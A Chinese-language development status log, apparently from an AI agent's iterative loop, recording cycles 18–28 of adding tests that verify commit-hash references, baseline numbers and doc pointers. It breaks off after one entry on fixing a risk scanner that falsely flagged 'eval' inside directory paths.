  cycle-17 修「门禁自己没人验证」，本轮修「**唤醒指针的提交链没人验证**」：守护者（GRAND-LOOP 唤醒指针）无人守护。
  * **缺陷（high）**：`docs/flow/GRAND-LOOP.md` 的「提交链」把 **cycle-16 A** 记成 `710a3af`（其实是 cycle-17 A），
    真正的 `a09421a` 在全文中 **0 次出现**；重复的 `710a3af` 恰好把缺失掩盖成"看起来完整"。任何照链取证的 agent
    （clone 后按链回溯、写交接文档、做归因）都会拿到错哈希，且没有任何门禁会报警。
  * **修复**：`710a3af`(❌错记 cycle-16 A）→ `a09421a`(cycle-16 A)；新增 `tests/test_wake_pointer_chain.py`（8 例），
    解析**活文档**（不用桩夹具）并 fail-closed 五条：① 链段落（`**cycle-A → cycle-B …**` 起、首个空行/`**` 止）与
    `head` 指针必须可定位；② 每条 `cycle-N` 记录须在 git 中存在，且其提交主题不得指向**别的** cycle；
    ③ 同一哈希不得标注两个 cycle；④ 链标题跨度须等于最新条目；⑤ `head` 指针须等于 `docs/baseline.json.head`。
    architect-skills B 提交在兄弟仓存在时一并校验（缺失时**不降级**为静默通过，登记为机器本地缺口）。
  * **自证（可复现）**：把真实文本改回缺陷态，守卫当场报 2 条违规 ——
    `hash 710a3af is annotated with conflicting cycles [16, 17]` +
    `hash 710a3af annotated cycle-16 but its commit says cycle-17`；另有负例
    （错标注 / 重复哈希 / 标题跨度不符 / 锚点丢失 / head 漂移）保证守卫自身有效。
  * **工效（本身即门禁质量）**：首版逐条目 spawn git 耗时 ~45s；改为**每仓一次** `git log --all` + 记忆化 → 10s。
  * 实测：全量 **1588 → 1596 passed**（1 xfailed），coverage **78.73% 持平**。
- **B：architect-skills 增量（commit `ee725bf`，分支 `master`）**：
  * `architect-test` 检查清单 13→**14（TES-14）**：文档/指针里的提交链与哈希引用必须被机器校验（存在性 + 标注一致 +
    同哈希不得双标 + 标题跨度 + 跨源 `head` 交叉），守卫须有负例自证与覆盖度自证，git 查询须批量化。
  * `architect-docs` 检查清单 5→**6（DOC-06）**：文档中的机器可读引用（提交哈希 / 版本号 / 基线数字 / 配置键名）
    必须有校验器并与单一事实源交叉，禁止只靠人工同步。
  * 二者均补 `guide.md` 检查清单行 + 「cycle-18 实测增补」节 + 口径演进注；`ARCHITECTURE-COVERAGE.md §5` 记 cycle-18。
  * 验证：`node scripts/validate-contracts.mjs` → **19 atom / 0 错 / 0 警**；`node tests/run-l1-tests.mjs` → **32 passed**。
- **C：19 维增量评估 + 观察项登记（`docs/design/2026-10-23-cycle18-A-wake-pointer-chain.md`）**：19 维**不变**
  （covered 14 / partial 4 / N/A 1）；`test` 维 TES-01..13 → **TES-01..14**；`docs` 维 DOC-01..05 → **DOC-01..06**。
  观察项：链中无 cycle 标注的条目（如"基线 1343/73.50"）只做存在性校验、不做语义校验；兄弟仓缺失时该仓条目
  退化为"未校验"（已用覆盖度阈值 + 兄弟仓存在时强制校验来兜底）。
- **D：回归 + 裁定流程**：`docs/flow/GRAND-LOOP.md` 唤醒指针刷新（head `c758387`，基线 **1596/78.73**，
  链至 cycle-18，标题跨度 cycle-5 → cycle-18）；用户裁定沿用（N-3 / R3 **不做**；coze I-1/I-3/I-4、
  cycle-12 条目 11/12/13 维持 candidate-pending）。
- 本轮结论：实测 1588/78.73 → **1596/78.73**（+8 用例，coverage 持平），工作树 clean；`run_gate.py --all` PASS；
  `scripts/docs_baseline.py` OK；`check_orphan_mechanisms.py` OK（wired 73 / test_only 15 / exempt 1 / orphan 0 / stale 0）。
- 全量无跳过（D11）；本轮无残余执行错误；R2（每项目沙箱）、WebUI、`guardian/risk_assessor.py::llm_review()`
  维持用户裁定不动（如实登记、未碰）。

### 13.44 cycle-19 A/B/C/D: 假哈希声明全仓扫描（缺陷引用不得伪装成声明）+ TES-15 - 2026-10-23
- **A：缺陷修复（commit `42928fa`，3 files / +2 用例）**：cycle-18 修好了"提交链 vs git 真值"，但**缺陷描述本身**
  又把错哈希照抄成声明形态 —— 同族缺陷的第四处：**记录里的否定句会被下一个取证脚本读成肯定句**。
  * **缺陷（high）**：cycle-18 的设计文档（2 处，含"修复前原文照抄"的栅栏块）与 status §13.43（1 处）把错哈希
    原样照抄成声明形态（哈希后紧跟「(cycle-16 A）」）；工作记录 `work_ooda/`（未纳版本控制）另有 1 处。
    cycle-18 的守卫只解析 GRAND-LOOP 的链段落，因此这几处"假声明"照旧存活，可被 grep 当证据。
  * **修复**：新增 `test_no_document_claims_a_hash_for_the_wrong_cycle` —— 遍历 `git ls-files --cached --others --exclude-standard`
    与本机 `work_ooda/**/*.md` 的 .md/.json/.py，对「哈希 + 紧跟 (cycle-N」形态逐条对照 git 主题（fail-closed），并带**覆盖度阈值**
    （命中数 >= 15，防"空解析全绿"）与**负例自证**（`test_the_repo_scan_catches_a_doctored_claim`）；
    文档侧把缺陷引用改写为「哈希 + (❌错记 cycle-16 A）」并在引用块顶加图例，使"提到错值"与"声明记录"可区分。
  * **首跑证据（修复前）**：3 条 `... hash 710a3af annotated cycle-16 but its commit says cycle-17` 形态的告警。
  * 实测：全量 **1596 → 1598 passed**（1 xfailed），coverage **78.73% 持平**。
- **B：architect-skills 增量（commit `d3f2ea6`，分支 `master`）**：`architect-test` 检查清单 14→**15（TES-15）**：
  文档里的"负例/缺陷引用"必须与机器可读的声明形态可区分（禁止把错值照抄成声明形态），扫描须覆盖设计文档 /
  status / 交接记录，并带覆盖度自证与负例自证；`guide.md` 检查清单行 + 「cycle-19 实测增补」节 + 口径演进注；
  `ARCHITECTURE-COVERAGE.md §5` 记 cycle-19。验证：`validate-contracts.mjs` → **19 atom / 0 错 / 0 警**；
  `run-l1-tests.mjs` → **32 passed**。
- **C：19 维增量评估 + 观察项登记（`docs/design/2026-10-23-cycle19-A-hash-claim-scan.md`）**：19 维**不变**
  （covered 14 / partial 4 / N/A 1）；`test` 维 TES-01..14 → **TES-01..15**。观察项：扫描只覆盖**版本控制内**的文件
  （tracked 文件全量 + 本机存在 `work_ooda/` 时并扫其 .md；新 clone 无此目录则自然跳过）；扫描覆盖 .md/.json/.py 三类。
- **D：回归 + 裁定流程**：`docs/flow/GRAND-LOOP.md` 唤醒指针刷新（head `42928fa`，基线 **1598/78.73**，
  链至 cycle-19，标题跨度 cycle-5 → cycle-19）；用户裁定沿用（N-3 / R3 **不做**；coze I-1/I-3/I-4、
  cycle-12 条目 11/12/13 维持 candidate-pending）。
- 本轮结论：实测 1596/78.73 → **1598/78.73**（+2 用例，coverage 持平），工作树 clean；`run_gate.py --all` PASS；
  `scripts/docs_baseline.py` OK；`check_orphan_mechanisms.py` OK（wired 73 / test_only 15 / exempt 1 / orphan 0 / stale 0）。
- 全量无跳过（D11）；本轮无残余执行错误；R2（每项目沙箱）、WebUI、`guardian/risk_assessor.py::llm_review()`
  维持用户裁定不动（如实登记、未碰）。

### 13.45 cycle-19 A2/C-D2（自我审计）：守卫漏扫"待提交"文件 + 缺陷引用形态再修 - 2026-10-23
- **触发**：用户追问"这个修复了嘛？"→ 复查时把守卫再跑一遍，结果**在刚提交的树上失败**：3 条
  `... hash 710a3af annotated cycle-16 but its commit says cycle-17`，全部指向 **cycle-19 自己的设计文档**。
- **两个根因（都是本轮自己引入的）**：
  * **漏扫待提交文件（chicken-and-egg）**：`scan_targets()` 用 `git ls-files` 只列 **tracked** 文件；cycle-19 的设计
    文档在"写的过程中"还是 untracked，扫不到；下一个提交把它变成 tracked，于是自己的守卫立刻报警。
    **"看不见即将提交的内容"的守卫，保护不了它自己创建的记录。**
  * **缺陷引用形态又写了一遍**：cycle-19 设计文档的"首跑证据"块把守卫的**失败消息原文照抄**，又把假声明形态
    写回文档 —— 正是 TES-15 要禁止的形态（同一轮内第二次踩）。
- **修复（commit `bee4bc8`，3 files）**：扫描改为 `git ls-files --cached --others --exclude-standard`
  （tracked + 待提交，忽略项仍排除）+ 本机 `work_ooda/**/*.md`；设计文档证据块改为"描述"而非"照抄形态"。
  * **证明**：向仓库根放一个含假声明的一行文件（untracked）→ 守卫立刻失败；删除后恢复 0 违规。
- **B2 回写（architect-skills commit `970e3a1`）**：`TES-15` 的触发词补上"扫描必须覆盖**待提交**文件
  （tracked + `--others --exclude-standard`）**加**本机工作记录"，并把 cycle-19 A2 事故作为范例写进 `guide.md`。
  验证：`validate-contracts.mjs` → 19 atom / 0 错 / 0 警；`run-l1-tests.mjs` → 32 passed。
- **验证**：全量 **1598 passed / 1 xfailed / 78.73%**（计数不变，改的是同一批用例）；`run_gate.py --all` PASS；
  `docs_baseline.py` OK；`check_orphan_mechanisms.py` OK。
- **方法论结论（本轮最有价值的一条）**：守卫的"证明"必须包含"**在提交后的树上再跑一次**"——
  否则守卫可能恰好看不见它要保护的那份记录（本轮就是实例）。这条已写入 architect-skills TES-15。

### 13.46 cycle-20 A/B — 正文散文与箭头链的「幽灵哈希」全仓清扫 + TES-16/DOC-07 - 2026-10-23

- **触发**：用户直问「任何照链取证的 agent（回溯代码、写交接、做归因）都会拿到错哈希，而错哈希会被当成事实一路传递。这个修复了嘛？」
  → 不做口头答复，直接三仓交叉取证（sloth-loop / legacy `sloth-loop` / architect-skills）。
- **结论：没修全**。cycle-18/19 守住的是 `` `hash`(cycle-N) `` 声明形态与 GRAND-LOOP 的 `**cycle-5 → cycle-19**` 区块；
  **正文散文里的裸哈希与 `A→B→C` 箭头链从未被任何守卫看过**。
- **命中 3 个幽灵哈希**（三仓都解析不出）：
  * `docs/flow/GRAND-LOOP.md` L53 legacy 补充链：❌错记 `11588a1` → 真值 `11542a1`（`1fb4846→11542a1→edf2a55` 的真实中间提交）。
  * `docs/design/2026-10-22-cycle14-C-state-history-export.md` L4：❌错记 `a67594c` → 真值 `a67594e`（该文档**自己的** step A 提交）。
  * `docs/flow/2026-09-05-grand-loop-status.md` §13.9：❌错记 `8cf9d4c` → 真值 `eb9f4b6`（建 `sloth_engine/backpressure.py` 的提交）。
  * 粗扫另有 `cfd2d6ef…`，是「外部发现重测产物」的 **md5**（文中带 `md5` 标签）→ 守卫按标签排除，避免把误报变成新噪声。
- **A 修复（commit `d2affd3`，4 files / +5 用例）**：
  * `test_no_shipped_document_names_a_nonexistent_hash`：shipped `.md`（tracked + 待提交）里的每个反引号哈希 + 箭头链哈希须解析到**已知仓**，fail-closed。
  * `test_shipped_arrow_chains_are_ancestor_ordered`：箭头链里**同仓相邻**哈希须**祖先相关**（一次 `rev-list --all --topo-order --parents` 建祖先表，不逐对 spawn）。
  * 递减守卫：`scanned > 30`、`runs >= 1`；负例自证 ×3（含合成双分支仓，用 `-c core.hooksPath=` 绕开本机慢 AK hook）。
  * **A2 自查**：自证探针发现 `ARROW_RUN_RE` 只认裸哈希 → 带反引号的箭头链整段漏检；已修（展平反引号，tokenizer + 拓扑两处）。
- **B 增量（architect-skills commit `edbcce0`）**：`architect-test` 15→**16**（TES-16）、`architect-docs` 6→**7**（DOC-07），
  并同步 guide 检查清单表格 + 口径演进 + `ARCHITECTURE-COVERAGE.md`。`validate-contracts.mjs` → **19 atom / 0 错 / 0 警**；`run-l1-tests.mjs` → **32 passed**。
- **D**：基线 1598/78.73 → **1604/78.73**（+6 例，coverage 持平）；唤醒指针 head `bee4bc8` → **`748cecd`**；链封至 cycle-5 → cycle-20；next target §13.46。
- **边界（诚实记录）**：只扫反引号哈希与箭头链，不扫任意裸 hex；且**纯数字 token 一律排除**
  （`20261023` 这类日期/版本号是确定的误报源；代价：真·纯数字缩写 7 位约 3.7% 会漏，已登记）
  → 约定「账本里的提交哈希一律反引号」；跨仓箭头只做存在性（跨仓祖先关系无定义）；legacy/arch 仓不在本机时对应哈希降级为「未校验」。
- **长期**：**「没人校验的记录」=「还没被发现的错」**。本次同族第五例，也是第一次由「守卫的自证」抓出守卫自己的缺口。
- **A3（写文档时守卫反弹）**：守卫**在本文档上报错**（`20261023` resolved in no known repo）——根因是守卫自己的精度缺陷（纯数字 token），已修＋边界自证用例。

### 13.47 cycle-21 A/B — 裸写提交哈希的机器校验（同行 git 上下文门控 + 外部源仓 pin 登记） - 2026-10-24

- **触发**：cycle-20 之后用户再追问「任何照链取证的 agent（回溯代码、写交接、做归因）都会拿到错哈希，而错哈希会被当成事实一路传递。这个修复了嘛？」→ 三仓交叉复查发现 cycle-20 只扫**反引号哈希 + 箭头链**；**裸哈希从未被任何守卫看过**。
- **结论：仍有盲区**。GRAND-LOOP 的**唤醒指针路径行**（`HEAD 1fb4846 … 362e479/af5cd11`）与 registry 的**提交列**（`766209c/24be2bb/56b1b6e`）都在**不带反引号**的散文里写提交哈希；全仓实测 **79 个唯一裸 token（179 处）** 无人校验。
- **实错 0 个，但发现一个新类别**：`2ee2239`（status 13 / cycle-1 行 "TencentDB@2ee2239"）在三仓都解析不出——它是**外部源仓** `TencentDB-Agent-Memory` 的真实提交（`SOURCE.md` 登记的源版本 pin）。若不登记该 checkout，加宽扫描会把**真 pin 误判为幽灵**（裸扫的第一个假阳性）。
- **A 修复（commit `de64aca`，+4 用例）**：
  * `_bare_git_context_tokens`：裸哈希**仅当同一行已含至少一个可解析提交引用**时才视为提交引用（该共现门控排除「字母全落在 a–f 的普通英文单词」这类噪声；裸扫必然误报）。
  * 带 `md5=`/`sha256:` 等**摘要标签**的行跳过；**纯数字 token 仍排除**（`20261014` 这类日期会与真哈希同现于 git 上下文行，实测会误报）。
  * 登记 **`EXT_SOURCE_REPOS`**：外部源仓 checkout 存在时并入已知仓，`2ee2239` 因此合法解析。
  * 自证：向仓库根放一个含裸「不存在的 7 位 token」（同行含真哈希）的未跟踪 `.md` → 守卫立刻 FAIL；删除后恢复 0 违规。
- **B 增量（architect-skills commit `a3681a4`）**：`architect-test` 16→**17**（TES-17）、`architect-docs` 7→**8**（DOC-08），并同步 guide 检查清单行 + 交叉引用小节 + `ARCHITECTURE-COVERAGE.md`。验证：`validate-contracts.mjs` → **19 atom / 0 错 / 0 警**；`run-l1-tests.mjs` → **32 passed**。
- **C：19 维增量评估 + 观察项登记（`docs/design/2026-10-24-cycle21-A-bare-hash-refs.md`）**：19 维**不变**（covered 14 / partial 4 / N/A 1）；`test` 维 TES-01..16 → **TES-01..17**。观察项：裸哈希规则依赖「同一行存在可解析引用」这一共现门控——**独占一行的裸哈希仍不受保护**（登记为边界，因裸扫必然误报全 hex 英文词）。
- **D：回归 + 裁定流程**：GRAND-LOOP 唤醒指针刷新（head `de64aca`，基线 **1608/78.73**，链至 cycle-21，标题跨度 cycle-5 → cycle-21）；用户裁定沿用（N-3 / R3 **不做**；coze I-1/I-3/I-4、cycle-12 条目 11/12/13 维持 candidate-pending）。
- **本轮结论**：实测 1604/78.73 → **1608/78.73**（+4 用例，coverage 持平），工作树 clean；`run_gate.py --all` PASS；`scripts/docs_baseline.py` OK；`check_orphan_mechanisms.py` OK（wired 73 / test_only 15 / exempt 1 / orphan 0 / stale 0）。
- **长期**：**「没人校验的记录」=「还没被发现的错」**——同族第六例。每加一层守卫，先证明它抓得住「已知坏样本」，再证明它在当前语料上不误报。

### 13.48 cycle-22 A/B — 跨仓账本扫描：分类器与边界（TES-18 / DOC-09）

- **触发**：用户「继续 启动大任务循环吧」。cycle-18~21 的账本守卫一直在**一个仓**里自我校验；cycle-22 第一次把同一套规则指向**兄弟语料**（legacy `sloth-loop` 2300 篇 shipped `.md`、architect-skills 86 篇）。
- **现象**：同一套擅长抓幽灵哈希的规则，在外部语料上产出 32 处 finding、**0 处是幽灵提交**——14 数据指纹 / 6 运行时对象 id / 9 被 amend 掉的中转提交与外部仓基线 / 3 守卫自身示例。规则没错，**语料不同**。
- **A 修复（commit `fb993dc`，+7 用例）**：
  * **全长度哈希解析**：缩写表只有 `%h`（7 字符），8~40 字符的提交哈希在任何仓都解析不出 → 误报。新增 `_subject_direct()` 与 `_to_full()` 的 `len(h) > 7` 分支。
  * **带分隔符的摘要标签**：`DIGEST_LABEL_RE` 原要求标签在行尾，`matrix_md5=<32hex>` 被读成提交声明 → 允许 `[:=]`。
  * **分类器（fail-closed）**：`classify_finding()` 只回答「为什么它不是提交声明」，默认仍是 `phantom`；`FINGERPRINT_EVIDENCE_RE` 比门禁的 `DIGEST_ANY_RE` 更松，**只用于取证报告**。
  * `scripts/audit_cross_repo_ledger.py` 复现整轮跨仓扫描；有无法解释的幽灵才 exit 1。
- **B 增量（architect-skills commit `f34dad6`）**：`architect-test` 17→**18**（TES-18）、`architect-docs` 8→**9**（DOC-09），并同步 guide 检查清单 + 口径演进 + `ARCHITECTURE-COVERAGE.md`。`validate-contracts.mjs` → **19 atom / 0 错 / 0 警**；`run-l1-tests.mjs` → **32 passed**。
- **C/D**：基线 1608/78.73 → **1615/78.73**（+7 用例，coverage 持平）；唤醒指针 head `de64aca` → **`fb993dc`**；链封到 cycle-22；`docs/design/2026-10-24-cycle22-A-cross-repo-ledger.md` 落盘。
- **第 7 例同族缺陷**：守卫示例 token 被逐字复刻（本仓 `architect-test/guide.md` 的 defaced / effaced / abc123d）——文档自己成了违规样本；已去掉代码跨度（那几行没有可解析提交引用，裸 token 因此不触发共现门控）。
- **边界（诚实记录）**：门禁仍**只扫本仓**（`ledger_targets()` = 本仓 tracked+pending `.md`；兄弟仓只在**解析**时作为已知仓参与）；分类器**只服务取证脚本**，不接入任何门禁；跨仓扫描口径 = 各仓 **shipped markdown**（机器可读契约 JSON 的规则文案不算账本）。
- **长期**：**「只在一个仓里校验的守卫」=「只在一个仓里成立的事实」**——守卫的能力边界必须和它的**语料边界**一起写下来，否则跨仓引用一多，守卫就会从「找错」退化成「报假阳性」。

### 13.49 cycle-23 A/B · 交付的验证器本身必须被验证：TES-19 / DOC-10

- **背景**：cycle-22 交付的 `scripts/audit_cross_repo_ledger.py` 是分类器 `classify_document(..)` 的唯一调用方，却 **0 覆盖**、exit code 从未被任何门禁跑过——「交付了验证器」≠「验证器被验证」。这是同族缺陷第 **8** 个面（前七：漏测 / 门禁没自证 / 提交链没人验证 / 缺陷描述复刻假形态 / 散文与箭头链裸奔 / 裸哈希裸奔 / 守卫示例被复刻进文档）。
- **A 轮（commit `feac425`，+3 用例）**：
  * **exit code 是断言**：合成语料 + 一条未解释幽灵 → 必须 `exit 1`；只放全部可解释语料 → 必须 `exit 0`；
  * **登记表不可静默腐烂**：遍历 `REGISTERED_UNRESOLVABLE`，每条都必须此刻仍解析不出任何已知仓，一旦可解析即 FAIL；
  * 单测清空 `DEFAULT_TARGETS`、只扫一次性合成仓，不依赖本机兄弟 checkout。
- **B 轮（architect-skills commit `14112db`）**：`architect-test` 18→**19**（TES-19）、`architect-docs` 9→**10**（DOC-10）；guide 检查清单 + 口径演进 + `ARCHITECTURE-COVERAGE.md`；`validate-contracts.mjs` → **19 atom / 0 错 / 0 警**、`run-l1-tests.mjs` → **32 passed**。
- **C/D**：实况 1615/78.73 → **1618/78.73**（+3 用例、coverage 持平）；head `fb993dc` → **`feac425`**；唤醒指针指向 cycle-23；新增 `docs/design/2026-10-24-cycle23-A-verify-the-verifier.md`。
- **取证实跑**：`scripts/audit_cross_repo_ledger.py` → legacy `sloth-loop` 20 处 / architect-skills 9 处，`unexplained 0`、exit 0。
- **结论**：**「交付了验证器」≠「验证器被验证」；「没人校验的判决」=「还没被发现的错」**。候选冻结项（N-3 / R3 / coze I-1/I-3/I-4 / cycle-12 条目 11/12/13）维持不变。

### 13.50 cycle-24 A/B · 校验器的作用域本身必须被校验：TES-20 / DOC-11

- **背景**：cycle-17 的 `scripts/docs_baseline.py` 用一份**手写清单** `CHECK_FILES` 防止当前态文档漂移，却漏掉了 `docs/flow/GRAND-LOOP.md`——新 agent 第一个读的 wake pointer；它引用的基线数字（passed / coverage）**无人校验**（wake-pointer 守卫只交叉核对它的 `head`）。同族缺陷第 **9** 个面：**被判定的对象集合无人校验**。
- **证据（改坏入口文档）**：把 wake pointer 改成 `9999 passed / coverage 55.55%` → `docs_baseline` 仍 `OK`、`tests/test_wake_pointer_chain.py` 仍 30 passed。修复后同一改法 → `docs_baseline` **FAIL exit 1** 并点名 `docs/flow/GRAND-LOOP.md`。
- **A 轮（commit `f127664`，+3 用例）**：`CHECK_FILES` 纳入 wake pointer；`tests/test_gate_self_verification.py` 23→**26**（入口文档在清单内 / 合成仓漂移自证 / 真实仓断言）。
- **B 轮（architect-skills commit `eafd45c`）**：`architect-test` 19→**20**（TES-20）、`architect-docs` 10→**11**（DOC-11）；guide 清单 + 口径演进 + `ARCHITECTURE-COVERAGE.md`；`validate-contracts.mjs` → **19 atom / 0 错 / 0 警**、`run-l1-tests.mjs` → **32 passed**。
- **C/D**：实况 1618/78.73 → **1621/78.73**（+3 用例、coverage 持平）；head `feac425` → **`f127664`**；唤醒指针指向 cycle-24；新增 `docs/design/2026-10-24-cycle24-A-verifier-scope.md`。
- **残余边界**：`docs_baseline` 只断言「文档里出现该数字」，不断言「只出现该数字」——同一文档内混入一个旧数字不会被抓（已知边界，登记在设计说明 §6）。
- **结论**：**「判决」要被测试（cycle-23），「被判定的集合」也要被测试（cycle-24）**；最该被信任的文件恰恰最容易没人查。候选冻结项（N-3 / R3 / coze I-1/I-3/I-4 / cycle-12 条目 11/12/13）维持不变。

### 13.51 cycle-25 A/B · 导航标号必须被机器校验：TES-21 / DOC-12

- **背景**：`docs/flow/GRAND-LOOP.md` 的『下一目标（自动，按 §13.N 排序）』是一个**手写指针**，每轮 C/D 手动 +1；`docs/flow/2026-09-05-grand-loop-status.md` 的最新小节由人工追加。两者之间**没有任何校验**——过期指针会把下一个执行者引到旧的『下一目标』清单。同族缺陷第 **10** 个面：**导航标号无人校验**（cycle-18/19/21 校验的是哈希指针，本轮是标号指针）。
- **证据（改坏指针）**：把指针从 §13.50 改成过期 §13.49 → `tests/test_wake_pointer_chain.py` 仍 30 passed、`docs_baseline` 仍 OK。修复后同一改法 → 该守卫 **FAIL**（`test_next_target_pointer_matches_the_registry_head`）。
- **A 轮（commit `460ff36`，+4 用例）**：`tests/test_wake_pointer_chain.py` 30→**34**——指针 = 注册表最新小节 / 注册表连续无重复 / 过期指针自证 / 重号与缺号自证 / 指针缺失 fail-closed。
- **B 轮（architect-skills commit `6fe1031`）**：`architect-test` 20→**21**（TES-21）、`architect-docs` 11→**12**（DOC-12）；guide 清单 + 口径演进 + `ARCHITECTURE-COVERAGE.md`；`validate-contracts.mjs` → **19 atom / 0 错 / 0 警**、`run-l1-tests.mjs` → **32 passed**。
- **C/D**：实况 1621/78.73 → **1625/78.73**（+4 用例、coverage 持平）；head `f127664` → **`460ff36`**；唤醒指针指向 cycle-25 且『下一目标』标号同步到 §13.51；新增 `docs/design/2026-10-24-cycle25-A-next-target-pointer.md`。
- **结论**：**哈希指针要被校验（cycle-18/19/21），标号指针也要被校验（cycle-25）**；手写的 +1 不是守卫。候选冻结项（N-3 / R3 / coze I-1/I-3/I-4 / cycle-12 条目 11/12/13）维持不变。

### 13.52 cycle-26 A/B · 一致性校验必须区分『当前态』与『历史态』：TES-22 / DOC-13

- **背景**：`scripts/docs_baseline.py` 只断言「基线数字在文档里**出现过**」，从不校验文档里**其余数字被标注过**——cycle-24 已把它登记为已知边界（设计说明 §6）。后果：`docs/sloth-loop-AS-BUILT.md` 第 169 行的 `758 passed`、`docs/sloth-loop-ROADMAP.md` §4 的 `734/745/755/758` **与现值并排且无任何锚点**，`docs_baseline` 仍 OK——旧数字会被读成现值。同族缺陷第 **11** 个面：**被判定数字的语义分层无人校验**（cycle-23 判决出口 / cycle-24 判定集合 / cycle-25 导航标号 / 本轮 当前态 vs 历史态）。
- **证据（旧校验 vs 新校验）**：收紧前 `docs_baseline` 对 AS-BUILT:169 与 ROADMAP §4 零报告；收紧后同一批数字立刻 **FAIL（7 条，逐条点名行号）**，补锚点后 OK。
- **A 轮（commit `b222d45`，+7 用例）**：`scripts/docs_baseline.py` 新增 `blocks()`（非空行分隔；列表项 / 标题 / 引用起新块）+ `unanchored_suite_counts()`（3 位以上 `N passed` 必须等于基线，或块内带 `20xx` / `cycle-N` / 「历史」锚点）；`docs/sloth-loop-AS-BUILT.md` / `docs/sloth-loop-ROADMAP.md` 补 7 处「历史快照」；`tests/test_gate_self_verification.py` 26→**33**。
- **B 轮（architect-skills commit `29e7fc1`）**：`architect-test` 21→**22**（TES-22）、`architect-docs` 12→**13**（DOC-13）；guide 清单 + 口径演进 + `ARCHITECTURE-COVERAGE.md`；`validate-contracts.mjs` → **19 atom / 0 错 / 0 警**、`run-l1-tests.mjs` → **32 passed**。
- **C/D**：实况 1625/78.73 → **1632/78.73**（+7 用例、coverage 持平）；head `460ff36` → **`b222d45`**；唤醒指针指向 cycle-26 且『下一目标』标号同步到 §13.52；顺手修正 `CLAUDE.md` 里哈希旁的**过期轮次标注**（「cycle-16 A」自 cycle-16 C/D 起从未随哈希更新），改为不绑定具体轮次的措辞；新增 `docs/design/2026-10-24-cycle26-A-historical-anchor.md`。
- **残余边界**：锚点只要求**可识别**（日期 / cycle-N / 「历史」），不校验「锚点 ↔ 数字」的**对应关系**；「哈希 ↔ 轮次标注一致」这类散文标注仍无校验（已登记为下一轮候选）；非 `N passed` 形态的基线（如单独成句的覆盖率）不在口径内。
- **结论**：**文档一致性校验必须分层**——当前态数字唯一等于基线（可机器判定），历史数字必须自带锚点；「紧挨现值却不标注」的旧数字就是漂移入口。候选冻结项（N-3 / R3 / coze I-1/I-3/I-4 / cycle-12 条目 11/12/13）维持不变。

### 13.53 cycle-27 A/B · 识别器的字母表不得窄于它审计的现实：TES-23 / DOC-14

- **背景**：cycle-26 登记的候选是「哈希旁的轮次标注无人校验」，往下挖却挖到**引擎**：`tests/test_wake_pointer_chain.py` 里 `ENTRY_RE` / `HEAD_RE` / `CLAIM_RE` 三个解析器各自硬编码 `[0-9a-f]{7}`，而幽灵规则早已采用 `[0-9a-f]{7,40}`。**比现实窄的识别器会静默丢弃记录**：把链条目里一条哈希改成同提交的 8 位写法 → 旧口径 `chain_entries` 49→48，而下限断言 `MIN_ENTRIES=20` 仍然通过，守卫报「无问题」而非报红（假阴性比误报更危险）。同族缺陷第 **12** 个面：**识别器自身的字母表无人校验**。
- **证据（可复现）**：① 链条目改成 8 位写法 → 旧口径丢条、守卫仍绿（新口径保住条数且仍能抓到真错）；② `docs/flow/2026-09-05-grand-loop-task.md` 里 `64de89b`（cycle-1 A→B→C→D 闭合…）用**全角括号**写作 → 旧口径 0 命中（全仓 49 vs 50）；③ 该提交只在 legacy 仓 `sloth-loop` 中，而 `claim_problems` 只看本仓 —— 即便被识别也会被报成幽灵。
- **A 轮（commit `a281839`，+10 用例）**：① 单一口径常量 `HASH_SRC = [0-9a-f]{7,40}` 由 `ENTRY_RE` / `HEAD_RE` / `CLAIM_RE` 共用；② `CLAIM_RE` 接受全角 / 半角括号 + 括号前空白；③ `claim_problems` 按「已知来源仓」逐个解析后再判幽灵；④ head 指针按**提交前缀**比较（git 缩写是唯一前缀）；⑤ 旧口径保留为 `NARROW_*` 缺陷见证。`tests/test_wake_pointer_chain.py` 34→**44**。
- **B 轮（architect-skills commit `1222959`）**：`architect-test` 22→**23**（TES-23）、`architect-docs` 13→**14**（DOC-14）；guide 清单 + 口径演进 + `ARCHITECTURE-COVERAGE.md`；`validate-contracts.mjs` → **19 atom / 0 错 / 0 警**、`run-l1-tests.mjs` → **32 passed**、跨仓账本扫描 unexplained 0 / exit 0。
- **C/D**：实况 1632/78.73 → **1642/78.73**（+10 用例、coverage 持平）；head `b222d45` → **`a281839`**；唤醒指针指向 cycle-27 且『下一目标』标号同步到 §13.53；cycle-26 登记的候选「哈希旁的轮次标注」随本轮口径放宽而闭合（`claim_problems` 现在能看见「反引号哈希 + 全 / 半角括号 + cycle-N」的全部形态，口径已写入 B 轮 DOC-14 ③）；新增 `docs/design/2026-10-24-cycle27-A-recogniser-alphabet.md`。
- **残余边界**：① `ENTRY_RE` 仍要求链条目用 **ASCII 括号**（全角括号的链条目仍会被静默跳过）；② `HEAD_RE` 仍要求固定前缀「代码 head 」；③ 轮次标注只在「反引号哈希 + 括号 + cycle-N」形态下被校验，逗号 / 破折号等分隔形态不可见；④ 跨仓解析放宽后，本仓打错的哈希若恰好命中别仓某提交即不再报幽灵。以上登记为下一轮候选。
- **结论**：**守卫的识别口径就是守卫自身的边界**——口径窄于现实时，记录被静默丢弃而所有下限断言仍然通过；因此「口径统一 + 跨来源解析 + 收紧即失效的红色自证」必须成为与「判定出口 / 作用域 / 导航标号 / 语义分层」并列的第 5 个面。候选冻结项（N-3 / R3 / coze I-1/I-3/I-4 / cycle-12 条目 11/12/13）维持不变。

### 13.54 cycle-28 A/B · 护栏门禁的三重盲区 + 首次建库竞态：TES-24 / DOC-15

- **背景（本轮出发点）**：用户指令是「还有要修复的问题吗？没有就开始全面压力/功能测试」。全量单测（1642 passed / 78.73%）与 cycle-1..27 的既有压测**全绿**，但 `loop-test-output/loop-eval-20261025-fullstress` 的**独立复跑**在 T2/T4/T6 抓到真缺陷——因为既有一切测试都**不驱动** Guardian：`RiskAssessor.assess` / `ToolPermission.resolve_risk` / `ContainmentError` 渲染**零行为覆盖**（覆盖数字来自模块导入的顺带执行）。「测试全绿」不等于「面被驱动过」：本轮第 13 个面 = *安全护栏的行为面无人驱动*。
- **D-G1（功能性阻断，已修）**：runtime root / 工作区路径含 `eval`（如 `loop-eval-20261025-fullstress`）时，第 1 轮所有 subprocess 即被拒。根因：`_scan_risk` 用 `\beval\b` 扫整条命令串，`-` 是词边界 ⇒ 路径 `.../loop-eval-2026/...` 命中 Dynamic code evaluation(0.6)，落在灰区 [0.25,0.80) ⇒ `deny`。修复：新增 `_is_intermediate_path_segment()`——词边界关键字落在路径 token 的**非末段**时不判定（命令可合法地位于末段，如 `/usr/bin/sudo`）。
